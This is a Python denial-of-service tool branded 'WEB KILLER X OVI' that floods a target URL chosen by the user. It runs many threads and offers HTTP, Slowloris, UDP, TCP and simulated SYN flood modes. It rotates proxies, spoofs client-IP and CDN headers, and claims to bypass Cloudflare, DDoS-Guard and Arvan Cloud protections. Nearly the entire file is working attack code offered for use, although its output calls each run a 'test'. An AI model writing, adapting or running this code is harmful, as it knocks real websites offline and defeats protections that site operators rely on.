#!/data/data/com.termux/files/usr/bin/python3

import requests
import threading
import random
import time
import sys
import os
import socket
import re
from urllib.parse import urlparse

# ========== COLOR DEFINITIONS ==========
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
RESET = "\033[0m"

# ========== SKULL BANNER ==========
def skull_banner():
    os.system("clear")
    banner = f"""
{R}                 ______
              .-"      "-.
             /            \\
            |              |
            |,  .-.  .-.  ,|
            | )(___)(___)( |
            |/     ' '     \\
             \_   ____   _/
               \________/
             ___|_|__|_|___
            /              \\

        [☠] WEB KILLER X OVI [☠]{RESET}
    """
    print(banner)

# SSL warning off
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebKillerX:
    def __init__(self, target, threads=200, duration=60, proxy_file=None, method="http"):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.proxy_file = proxy_file
        self.method = method.lower()
        self.running = True
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()
        
        self.session = requests.Session()
        self.proxies = []
        
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.hostname
        self.path = self.parsed_url.path or "/"
        self.scheme = self.parsed_url.scheme
        self.port = 443 if self.scheme == "https" else 80
        
        self.cf_cookie = None
        self.user_agent = None
        
        if proxy_file and method in ["http", "cfb", "cfbuam", "bypass", "dgb", "avb"]:
            self.load_proxies()
    
    def load_proxies(self):
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{G}[✓] Loaded {len(self.proxies)} proxies{RESET}")
        except Exception as e:
            print(f"{R}[!] Error reading proxy file: {e}{RESET}")
            self.proxies = []
    
    def get_random_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
    
    def random_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ]
        self.user_agent = random.choice(user_agents)
        referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            self.target
        ]
        return {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": random.choice(referers),
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    # ========== BYPASS - generic AntiDDoS bypass ==========
    def bypass_headers(self):
        headers = self.random_headers()
        headers.update({
            "X-Requested-With": "XMLHttpRequest",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Host": self.host,
            "X-Forwarded-Host": self.host,
            "X-Forwarded-Proto": self.scheme,
            "X-Forwarded-Port": str(self.port),
            "X-Forwarded-Server": self.host,
            "Via": f"1.1 {random.choice(['proxy', 'cache', 'cdn'])}-{random.randint(1,999)}",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        })
        return headers
    
    # ========== DGB - DDoS Guard bypass ==========
    def dgb_headers(self):
        headers = self.bypass_headers()
        headers.update({
            "Accept-Charset": "utf-8",
            "Accept-Datetime": time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()),
            "DNT": "1",
            "X-Mobile": str(random.choice([0, 1])),
            "X-Purpose": "preview",
            "X-UIDH": "".join(random.choices("0123456789abcdef", k=32)),
            "X-UID": "".join(random.choices("0123456789", k=10)),
            "X-Csrf-Token": "".join(random.choices("0123456789abcdef", k=32)),
            "X-Request-ID": "".join(random.choices("0123456789abcdef", k=16))
        })
        return headers
    
    # ========== AVB - Arvan Cloud bypass ==========
    def avb_headers(self):
        headers = self.bypass_headers()
        headers.update({
            "X-Security": "bypass",
            "X-Arvan-Cloud": "true",
            "X-Cache-Status": "BYPASS",
            "X-Cache": "BYPASS",
            "X-Served-By": f"arvan-cloud-{random.randint(1,100)}",
            "X-Cache-Hits": "0",
            "X-Timer": f"S{int(time.time())}.{random.randint(100000,999999)}",
            "X-Edge-Location": random.choice(['ir', 'tr', 'de', 'nl', 'gb']),
            "X-Edge-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        })
        return headers
    
    # ========== SLOW - Slowloris ==========
    def slowloris_attack(self):
        socks = []
        try:
            for _ in range(min(self.threads, 200)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.host, self.port))
                    sock.send(f"GET {self.path}?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {self.host}\r\n".encode())
                    sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                    socks.append(sock)
                except:
                    pass
            
            while self.running:
                for sock in socks[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                        with self.lock:
                            self.sent += 1
                            sys.stdout.write(f"{G}•{RESET}")
                    except:
                        socks.remove(sock)
                        with self.lock:
                            self.failed += 1
                            sys.stdout.write(f"{R}x{RESET}")
                time.sleep(5)
                sys.stdout.flush()
        except Exception as e:
            print(f"\n{R}Slowloris error: {e}{RESET}")
        finally:
            for sock in socks:
                sock.close()
    
    # ========== UDP flood ==========
    def udp_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
        target_ip = self.host
        port = self.port
        timeout = time.time() + self.duration
        while self.running and time.time() < timeout:
            try:
                sock.sendto(packet, (target_ip, port))
                with self.lock:
                    self.sent += 1
                    sys.stdout.write(f"{G}•{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
        sock.close()
    
    # ========== SYN flood (simulated) ==========
    def syn_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        target_ip = self.host
        port = self.port
        timeout = time.time() + self.duration
        while self.running and time.time() < timeout:
            try:
                sock.connect_ex((target_ip, port))
                with self.lock:
                    self.sent += 1
                    sys.stdout.write(f"{G}•{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
        sock.close()
    
    # ========== TCP flood ==========
    def tcp_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        target_ip = self.host
        port = self.port
        timeout = time.time() + self.duration
        data = random._urandom(1024)
        while self.running and time.time() < timeout:
            try:
                sock.connect((target_ip, port))
                sock.send(data)
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                with self.lock:
                    self.sent += 1
                    sys.stdout.write(f"{G}•{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
        sock.close()
    
    def http_attack_with_headers(self, header_func):
        while self.running:
            try:
                headers = header_func()
                proxies = self.get_random_proxy() if self.proxies else None
                r = self.session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                with self.lock:
                    self.sent += 1
                    if r.status_code == 200:
                        sys.stdout.write(f"{G}•{RESET}")
                    else:
                        sys.stdout.write(f"{Y}?{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
    
    def bypass_attack(self):
        self.http_attack_with_headers(self.bypass_headers)
    
    def dgb_attack(self):
        self.http_attack_with_headers(self.dgb_headers)
    
    def avb_attack(self):
        self.http_attack_with_headers(self.avb_headers)
    
    def http_attack(self):
        self.http_attack_with_headers(self.random_headers)
    
    def cfb_attack(self):
        while self.running:
            try:
                headers = self.random_headers()
                headers.update({
                    "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Forwarded-Host": self.host,
                    "X-Forwarded-Proto": self.scheme,
                    "X-Host": self.host,
                    "X-Forwarded-Server": self.host,
                    "Forwarded": f"for={random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)};host={self.host};proto={self.scheme}",
                    "Via": f"1.1 cloudflare-{random.randint(1,999)}",
                    "CF-Ray": f"{random.choice(['ORD', 'DFW', 'LHR', 'CDG'])}{random.randint(100,999)}-{random.choice(['ORD', 'DFW', 'LHR', 'CDG'])}",
                    "CF-Visitor": '{"scheme":"https"}',
                    "CDN-Loop": "cloudflare",
                    "True-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                })
                proxies = self.get_random_proxy() if self.proxies else None
                r = self.session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                with self.lock:
                    self.sent += 1
                    if r.status_code == 200:
                        sys.stdout.write(f"{G}•{RESET}")
                    else:
                        sys.stdout.write(f"{Y}?{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
    
    def solve_cf_challenge(self, first_response):
        try:
            html = first_response.text
            match = re.search(r'name="jschl_answer" value="([^"]+)"', html)
            if match:
                jschl_answer = match.group(1)
                pass_match = re.search(r'name="pass" value="([^"]+)"', html)
                cf_pass = pass_match.group(1) if pass_match else None
                cf_clearance = first_response.cookies.get('cf_clearance')
                if cf_clearance:
                    return {
                        'cf_clearance': cf_clearance,
                        'pass': cf_pass,
                        'jschl_answer': jschl_answer
                    }
        except:
            pass
        return None
    
    def cfbuam_attack(self):
        local_session = requests.Session()
        if self.proxies:
            proxy = self.get_random_proxy()
            local_session.proxies.update(proxy)
        
        try:
            headers = self.random_headers()
            resp = local_session.get(self.target, headers=headers, timeout=10, verify=False)
            challenge_data = self.solve_cf_challenge(resp)
            if challenge_data:
                submit_url = f"{self.scheme}://{self.host}/cdn-cgi/l/chk_jschl"
                submit_headers = self.random_headers()
                submit_headers.update({
                    'Referer': self.target,
                    'Cookie': f'cf_clearance={challenge_data["cf_clearance"]}'
                })
                submit_data = {
                    'jschl_answer': challenge_data['jschl_answer'],
                    'pass': challenge_data.get('pass', '')
                }
                local_session.post(submit_url, headers=submit_headers, data=submit_data, timeout=10, verify=False)
                
                while self.running:
                    try:
                        headers = self.random_headers()
                        headers['Cookie'] = f'cf_clearance={challenge_data["cf_clearance"]}'
                        r = local_session.get(self.target, headers=headers, timeout=5, verify=False)
                        with self.lock:
                            self.sent += 1
                            if r.status_code == 200:
                                sys.stdout.write(f"{G}•{RESET}")
                            else:
                                sys.stdout.write(f"{Y}?{RESET}")
                    except Exception:
                        with self.lock:
                            self.failed += 1
                            sys.stdout.write(f"{R}x{RESET}")
                    sys.stdout.flush()
            else:
                self.cfb_attack()
        except Exception:
            with self.lock:
                self.failed += 1
    
    def start(self):
        print(f"{C}[+] Target:{RESET} {self.target}")
        print(f"{C}[+] Threads:{RESET} {self.threads}")
        print(f"{C}[+] Duration:{RESET} {self.duration} seconds")
        print(f"{C}[+] Method:{RESET} {self.method.upper()}")
        if self.proxies:
            print(f"{C}[+] Using proxies:{RESET} Yes ({len(self.proxies)} loaded)")
        else:
            print(f"{C}[+] Using proxies:{RESET} No")
        print()
        print(f"{Y}[!] Test started... Press Ctrl+C to stop{RESET}\n")
        
        attack_func = self.http_attack
        if self.method == "bypass":
            attack_func = self.bypass_attack
        elif self.method == "dgb":
            attack_func = self.dgb_attack
        elif self.method == "avb":
            attack_func = self.avb_attack
        elif self.method == "slow":
            attack_func = self.slowloris_attack
        elif self.method == "udp":
            attack_func = self.udp_attack
        elif self.method == "syn":
            attack_func = self.syn_attack
        elif self.method == "tcp":
            attack_func = self.tcp_attack
        elif self.method == "cfb":
            attack_func = self.cfb_attack
        elif self.method == "cfbuam":
            attack_func = self.cfbuam_attack
        
        for _ in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
        
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                print(f"\r⏱️  Elapsed: {elapsed}/{self.duration} | 📤 Sent: {self.sent} | ❌ Failed: {self.failed}", end="")
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped by user{RESET}")
        finally:
            self.running = False
            time.sleep(2)
            print(f"\n\n{G}[✓] Test completed!{RESET}")
            print(f"{G}📊 Total sent: {self.sent}{RESET}")
            print(f"{R}❌ Total failed: {self.failed}{RESET}")
            if (self.sent + self.failed) > 0:
                success_rate = (self.sent / (self.sent + self.failed)) * 100
                print(f"{C}📈 Success rate: {success_rate:.2f}%{RESET}")

def main():
    skull_banner()
    
    print(f"{C}┌─[WEB KILLER X OVI]{RESET}")
    print(f"{C}└─[Enter target URL (e.g., https://yoursite.com)]{RESET}")
    target = input().strip()
    if not target.startswith("http"):
        target = "http://" + target
    
    threads = 200
    try:
        print(f"{C}[?] Number of threads (default 200):{RESET}")
        threads_input = input().strip()
        if threads_input:
            threads = int(threads_input)
    except:
        threads = 200
    
    duration = 60
    try:
        print(f"{C}[?] Duration in seconds (default 60):{RESET}")
        duration_input = input().strip()
        if duration_input:
            duration = int(duration_input)
    except:
        duration = 60
    
    use_proxy = ""
    while use_proxy.lower() not in ["y", "n", "yes", "no"]:
        print(f"{C}[?] Use proxies? (y/n):{RESET}")
        use_proxy = input().strip().lower()
    
    proxy_file = None
    if use_proxy.startswith("y"):
        print(f"{C}[?] Proxy file name (e.g., proxy.txt):{RESET}")
        proxy_file = input().strip()
    
    # Method selection
    print(f"\n{C}Select attack method:{RESET}")
    print("  1. http (HTTP Flood)")
    print("  2. cfb (Cloudflare Bypass)")
    print("  3. cfbuam (Cloudflare Under Attack Mode Bypass)")
    print("  4. bypass (Generic AntiDDoS Bypass)")
    print("  5. dgb (DDoS Guard Bypass)")
    print("  6. avb (Arvan Cloud Bypass)")
    print("  7. slow (Slowloris)")
    print("  8. udp (UDP Flood)")
    print("  9. syn (SYN Flood - simulated)")
    print(" 10. tcp (TCP Flood)")
    print(f"{C}Enter choice (1-10, default 1):{RESET}")
    
    method_choice = input().strip()
    method_map = {
        "1": "http",
        "2": "cfb",
        "3": "cfbuam",
        "4": "bypass",
        "5": "dgb",
        "6": "avb",
        "7": "slow",
        "8": "udp",
        "9": "syn",
        "10": "tcp"
    }
    method = method_map.get(method_choice, "http")
    
    print(f"\n{Y}[*] Starting attack with following parameters:{RESET}")
    print(f"    Target : {target}")
    print(f"    Threads: {threads}")
    print(f"    Time   : {duration} seconds")
    print(f"    Method : {method.upper()}")
    if proxy_file:
        print(f"    Proxy  : {proxy_file}")
    print()
    
    tester = WebKillerX(
        target=target,
        threads=threads,
        duration=duration,
        proxy_file=proxy_file,
        method=method
    )
    tester.start()

if __name__ == "__main__":
    main()
